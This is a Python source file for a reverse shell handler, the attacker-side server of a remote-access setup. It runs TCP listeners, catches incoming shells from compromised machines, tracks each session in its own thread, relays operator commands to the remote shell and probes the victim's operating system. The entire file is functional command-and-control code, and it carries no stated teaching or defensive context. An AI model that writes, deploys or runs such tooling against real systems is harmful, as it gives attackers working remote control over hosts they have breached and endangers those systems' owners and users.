"""
Reverse Shell Handler - Core engine for managing TCP listeners and interactive shell sessions.
"""

import socket
import threading
import time
import uuid
import os

class Session:
    """Represents an active reverse shell connection."""
    
    def __init__(self, session_id, sock, address, listener_port):
        self.id = session_id
        self.socket = sock
        self.address = address
        self.listener_port = listener_port
        self.os_type = 'unknown'
        self.created_at = time.time()
        self.output_buffer = []
        self.output_lock = threading.Lock()
        self.active = True
        self.history = []
        self._reader_thread = None
    
    def add_output(self, data: str):
        """Thread-safe append to output buffer."""
        with self.output_lock:
            # Split by lines and add each line
            for line in data.split('\n'):
                line = line.rstrip('\r')
                if line:
                    self.output_buffer.append(line)
            # Keep buffer manageable (last 2000 lines)
            if len(self.output_buffer) > 2000:
                self.output_buffer = self.output_buffer[-2000:]
    
    def get_output_since(self, since_index: int) -> tuple:
        """Get all output lines since `since_index`. Returns (lines, new_index)."""
        with self.output_lock:
            total = len(self.output_buffer)
            if since_index >= total:
                return [], total
            new_lines = self.output_buffer[since_index:]
            return new_lines, total
    
    def send_command(self, cmd: str):
        """Send a command to the shell."""
        if not self.active:
            return False
        try:
            self.socket.sendall((cmd + '\n').encode('utf-8', errors='ignore'))
            self.history.append(cmd)
            if len(self.history) > 500:
                self.history = self.history[-500:]
            return True
        except Exception:
            self.active = False
            return False
    
    def close(self):
        """Close the session socket."""
        self.active = False
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.socket.close()
        except Exception:
            pass
    
    def to_dict(self):
        return {
            'id': self.id,
            'address': f"{self.address[0]}:{self.address[1]}",
            'listener_port': self.listener_port,
            'os_type': self.os_type,
            'created_at': self.created_at,
            'active': self.active,
            'history_count': len(self.history),
            'output_lines': len(self.output_buffer)
        }


class Listener(threading.Thread):
    """A TCP listener that accepts reverse shell connections on a specific port."""
    
    def __init__(self, port: int, manager: 'ReverseShellManager'):
        super().__init__(daemon=True)
        self.port = port
        self.manager = manager
        self.running = False
        self.server_socket = None
    
    def run(self):
        self.running = True
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            print(f"[*] Reverse Shell Listener started on 0.0.0.0:{self.port}")
            
            while self.running:
                try:
                    client_sock, address = self.server_socket.accept()
                    session_id = str(uuid.uuid4())[:8]
                    session = Session(session_id, client_sock, address, self.port)
                    self.manager.add_session(session)
                    print(f"[+] New reverse shell session {session_id} from {address[0]}:{address[1]} on port {self.port}")
                    
                    # Start reader thread for this session
                    reader = threading.Thread(target=self._read_loop, args=(session,), daemon=True)
                    session._reader_thread = reader
                    reader.start()
                    
                    # Auto-detect OS
                    self._detect_os(session)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Listener error on port {self.port}: {e}")
        except Exception as e:
            print(f"[!] Failed to start listener on port {self.port}: {e}")
        finally:
            self.running = False
    
    def _read_loop(self, session: Session):
        """Continuously read from the session socket."""
        session.socket.settimeout(0.5)
        buffer = ''
        while session.active and self.running:
            try:
                data = session.socket.recv(4096)
                if not data:
                    break
                decoded = data.decode('utf-8', errors='replace')
                session.add_output(decoded)
            except socket.timeout:
                continue
            except Exception:
                break
        session.active = False
        print(f"[-] Session {session.id} disconnected")
    
    def _detect_os(self, session: Session):
        """Try to detect the target OS."""
        time.sleep(0.5)
        try:
            session.socket.sendall(b'echo __OS_DETECT__; uname -s 2>/dev/null || ver 2>/dev/null || echo __UNKNOWN__\n')
            time.sleep(1.0)
        except Exception:
            pass
        # Check output buffer for clues
        with session.output_lock:
            full_output = '\n'.join(session.output_buffer).lower()
            if 'linux' in full_output or 'darwin' in full_output:
                session.os_type = 'linux'
            elif 'windows' in full_output or 'microsoft' in full_output:
                session.os_type = 'windows'
            else:
                session.os_type = 'unknown'
    
    def stop(self):
        """Stop the listener."""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass


class ReverseShellManager:
    """Singleton manager for all reverse shell listeners and sessions."""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self.listeners: dict[int, Listener] = {}
        self.sessions: dict[str, Session] = {}
        self._sessions_lock = threading.Lock()
    
    def start_listener(self, port: int) -> dict:
        """Start a new listener on the given port."""
        if port in self.listeners:
            listener = self.listeners[port]
            if listener.running:
                return {'success': False, 'error': f'Listener already running on port {port}'}
        
        listener = Listener(port, self)
        listener.start()
        self.listeners[port] = listener
        return {'success': True, 'port': port, 'message': f'Listener started on port {port}'}
    
    def stop_listener(self, port: int) -> dict:
        """Stop a listener and close all its sessions."""
        if port not in self.listeners:
            return {'success': False, 'error': f'No listener on port {port}'}
        
        listener = self.listeners[port]
        listener.stop()
        
        # Close all sessions on this port
        with self._sessions_lock:
            to_remove = [sid for sid, s in self.sessions.items() if s.listener_port == port]
            for sid in to_remove:
                self.sessions[sid].close()
                del self.sessions[sid]
        
        del self.listeners[port]
        return {'success': True, 'message': f'Listener on port {port} stopped'}
    
    def add_session(self, session: Session):
        """Register a new session."""
        with self._sessions_lock:
            self.sessions[session.id] = session
    
    def get_session(self, session_id: str) -> Session | None:
        """Get a session by ID."""
        return self.sessions.get(session_id)
    
    def close_session(self, session_id: str) -> dict:
        """Close a specific session."""
        session = self.sessions.get(session_id)
        if not session:
            return {'success': False, 'error': 'Session not found'}
        session.close()
        with self._sessions_lock:
            del self.sessions[session_id]
        return {'success': True, 'message': f'Session {session_id} closed'}
    
    def get_all_listeners(self) -> list:
        """Get status of all listeners."""
        return [{
            'port': port,
            'running': listener.running,
            'session_count': sum(1 for s in self.sessions.values() if s.listener_port == port and s.active)
        } for port, listener in self.listeners.items()]
    
    def get_all_sessions(self) -> list:
        """Get all active sessions."""
        return [s.to_dict() for s in self.sessions.values() if s.active]
    
    def get_local_ip(self) -> str:
        """Get the local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'
    
    def shutdown_all(self):
        """Stop all listeners and close all sessions."""
        for port in list(self.listeners.keys()):
            self.stop_listener(port)
